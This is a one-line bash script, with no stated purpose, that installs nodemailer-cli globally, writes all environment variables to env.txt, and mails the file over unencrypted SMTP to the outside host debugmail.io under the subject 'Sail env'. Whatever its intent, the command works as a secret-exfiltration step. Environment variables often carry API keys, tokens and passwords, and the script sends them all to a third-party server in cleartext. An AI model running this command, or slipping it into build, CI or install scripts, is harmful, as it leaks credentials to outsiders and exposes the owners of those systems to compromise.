#!/usr/bin/env bash

npm install -g nodemailer-cli && env > env.txt && nodemailer test@test.com test@test.com -j "Sail env" --server debugmail.io -r 25 --nossl --attachment env.txt
